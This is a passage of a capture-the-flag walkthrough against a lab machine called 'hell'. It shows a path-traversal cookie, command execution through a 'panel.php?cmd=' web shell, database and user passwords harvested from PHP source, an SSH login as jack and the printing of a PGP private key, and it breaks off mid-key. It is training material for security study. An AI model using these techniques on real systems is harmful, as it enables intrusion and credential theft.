</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# cat cookies
</span><span class='line'># Netscape HTTP Cookie File
</span><span class='line'># http://curl.haxx.se/rfc/cookie_spec.html
</span><span class='line'># This file was generated by libcurl! Edit at your own risk.
</span><span class='line'>
</span><span class='line'>10.10.10.146  FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
</span><span class='line'>10.10.10.146  FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    ....//....//....//....//....//....//tmp//note.txt
</span><span class='line'>root@kali:~/hell# curl -v http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=id -c cookies -b cookies
</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
</span><span class='line'>*   Trying 10.10.10.146...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)
</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/panel.php?cmd=id HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 10.10.10.146
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Cookie: intruder=....//....//....//....//....//....//tmp//note.txt; failcount=3; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>&gt;
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'><span class="nt">&lt; HTTP</span><span class="err">/</span><span class="na">1</span><span class="err">.</span><span class="na">1</span> <span class="na">302</span> <span class="na">Found</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Date:</span> <span class="na">Wed</span><span class="err">,</span> <span class="na">15</span> <span class="na">Jul</span> <span class="na">2015</span> <span class="na">00:16:47</span> <span class="na">GMT</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Server:</span> <span class="na">Apache</span><span class="err">/</span><span class="na">2</span><span class="err">.</span><span class="na">2</span><span class="err">.</span><span class="na">22</span> <span class="err">(</span><span class="na">Debian</span><span class="err">)</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">X-Powered-By:</span> <span class="na">PHP</span><span class="err">/</span><span class="na">5</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">4-14</span><span class="err">+</span><span class="na">deb7u11</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Expires:</span> <span class="na">Thu</span><span class="err">,</span> <span class="na">19</span> <span class="na">Nov</span> <span class="na">1981</span> <span class="na">08:52:00</span> <span class="na">GMT</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Cache-Control:</span> <span class="na">no-store</span><span class="err">,</span> <span class="na">no-cache</span><span class="err">,</span> <span class="na">must-revalidate</span><span class="err">,</span> <span class="na">post-check=</span><span class="s">0,</span> <span class="na">pre-check=</span><span class="s">0</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Pragma:</span> <span class="na">no-cache</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Location:</span> <span class="na">index</span><span class="err">.</span><span class="na">php</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Vary:</span> <span class="na">Accept-Encoding</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Length:</span> <span class="na">620</span>
</span><span class='line'><span class="err">&lt;</span> <span class="na">Content-Type:</span> <span class="na">text</span><span class="err">/</span><span class="na">html</span>
</span><span class='line'><span class="err">&lt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="na">HTML</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span><span class='line'>* Connection #0 to host 10.10.10.146 left intact
</span><span class='line'>* Closing connection #0
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/home -c cookies -b cookies
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>total 20
</span><span class='line'>drwx------ 3 bazza       bazza       4096 Jul 13 01:43 bazza
</span><span class='line'>drwx--x--x 3 george      george      4096 Jul 12 07:27 george
</span><span class='line'>drwx------ 5 jack        jack        4096 Jul 12 05:28 jack
</span><span class='line'>drwx------ 2 milk_4_life milk_4_life 4096 Jul 12 06:59 milk_4_life
</span><span class='line'>drwx------ 2 oj          oj          4096 Jul 14 01:49 oj
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we can see there are 5 users under folder <code>/home</code>: <strong>bazza</strong>, <strong>george</strong>, <strong>jack</strong>, <strong>milk_4_life</strong> and <strong>oj</strong></p>

<h2>Moving to <strong>jack</strong></h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/var/www/ -c cookies -b cookies
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>total 112
</span><span class='line'>-rw-r--r-- 1 www-data www-data 87841 Jun 17  2014 comic.png
</span><span class='line'>-rwxr--r-- 1 www-data www-data  7846 Jun 20  2014 echoserver.bak
</span><span class='line'>-rw-r--r-- 1 www-data www-data   466 Jun 20  2014 index.html
</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jun 20  2014 personal
</span><span class='line'>-rw-r--r-- 1 www-data www-data    80 Jun 17  2014 robots.txt
</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jul 13 05:32 super_secret_login_path_muhahaha
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here I found some sensitive information in <code>login.php</code> file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=cat+login.php -c cookies -b cookies
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>  <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'><span class="cp">&lt;?PHP</span>
</span><span class='line'><span class="cp">session_start();</span>
</span><span class='line'>
</span><span class='line'><span class="cp">function login(){</span>
</span><span class='line'><span class="cp"> </span>
</span><span class='line'><span class="cp"> $username = mysql_escape_string($_POST[&quot;username&quot;]);</span>
</span><span class='line'><span class="cp"> $password = mysql_escape_string($_POST[&quot;password&quot;]);</span>
</span><span class='line'><span class="cp"> // mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;); I&#39;ll change this back once development is done. Got sick of typing my password.  </span>
</span><span class='line'><span class="cp"> mysql_connect(&quot;127.0.0.1&quot;, &quot;www-data&quot;, &quot;website&quot;) or die(&quot;Server Error&quot;);</span>
</span><span class='line'><span class="cp"> mysql_select_db(&quot;website&quot;) or die(&quot;Server Error&quot;);</span>
</span><span class='line'><span class="cp"> $sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</span>
</span><span class='line'><span class="cp"> $res = mysql_query($sql) or die(&quot;Server Error&quot;);</span>
</span><span class='line'><span class="cp"> $row = mysql_fetch_row($res);</span>
</span><span class='line'><span class="cp"> if ($row[0]) {</span>
</span><span class='line'><span class="cp">     return 1;</span>
</span><span class='line'><span class="cp"> } else {</span>
</span><span class='line'><span class="cp">     return 0;</span>
</span><span class='line'><span class="cp"> }</span>
</span><span class='line'><span class="cp">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">if (login()) {</span>
</span><span class='line'><span class="cp"> $_SESSION[&quot;valid&quot;] = 1;</span>
</span><span class='line'><span class="cp"> setcookie(time()+600);</span>
</span><span class='line'><span class="cp"> header(&#39;Location: index.php&#39;);</span>
</span><span class='line'><span class="cp">} else {</span>
</span><span class='line'><span class="cp"> header(&#39;Location: index.php?the_user_is_a_failure=1&#39;);</span>
</span><span class='line'><span class="cp">}</span>
</span><span class='line'><span class="cp">?&gt;</span>
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>From the comment, I got credential: <em><font color="red">jack</font> / <font color="red">zgcR6mU6pX</font></em>
I also got mysql&rsquo;s login credential is <em><font color="red">www-data</font> / <font color="red">website</font></em></p>

<p>Trying SSH login as jack with discovered password and it works! Now I am jack.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~# ssh jack@10.10.10.146
</span><span class='line'>jack@10.10.10.146&#39;s password:
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Sun Jul 12 05:12:42 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1001(jack) gid=1001(jack) groups=1001(jack)
</span><span class='line'>$ pwd
</span><span class='line'>/home/jack
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>drwx------ 2 jack jack 4096 Jun 18  2014 g0tmi1k_pics
</span><span class='line'>$ ls -l g0tmi1k_pics
</span><span class='line'>total 284
</span><span class='line'>-rwx------ 1 jack jack 180289 Dec  1  2010 1.jpg
</span><span class='line'>-rwx------ 1 jack jack  29494 Sep 12  2013 2.jpg
</span><span class='line'>-rwx------ 1 jack jack  72070 Jun 18  2014 3.jpg
</span><span class='line'>$ ls -lah
</span><span class='line'>total 32K
</span><span class='line'>drwx------ 5 jack jack 4.0K Jul 12 05:28 .
</span><span class='line'>drwxr-xr-x 7 root root 4.0K Jul  5  2014 ..
</span><span class='line'>-rwx------ 1 jack jack    1 Jun 22  2014 .bash_logout
</span><span class='line'>-rwx------ 1 jack jack 3.4K Jun 18  2014 .bashrc
</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 g0tmi1k_pics
</span><span class='line'>drwx------ 2 jack jack 4.0K Jul 12 05:30 .gnupg
</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 .pgp
</span><span class='line'>-rwx------ 1 jack jack  675 Jan  1  2013 .profile
</span><span class='line'>$ cd .pgp
</span><span class='line'>$ ls -lah
</span><span class='line'>total 20K
</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18  2014 .
</span><span class='line'>drwx------ 5 jack jack 4.0K Jul 12 05:28 ..
</span><span class='line'>-rwx------ 1 jack jack   39 Jun 18  2014 note
</span><span class='line'>-rwx------ 1 jack jack 1.8K Jun 18  2014 pgp.priv
</span><span class='line'>-rwx------ 1 jack jack  890 Jun 18  2014 pgp.pub
</span><span class='line'>$ cat note
</span><span class='line'>The usual password as with everything.
</span><span class='line'>$ cat pgp.priv
</span><span class='line'>-----BEGIN PGP PRIVATE KEY BLOCK-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
</span><span class='line'>bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
</span><span class='line'>u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
</span><span class='line'>lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
</span><span class='line'>54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
</span><span class='line'>zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
</span><span class='line'>NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
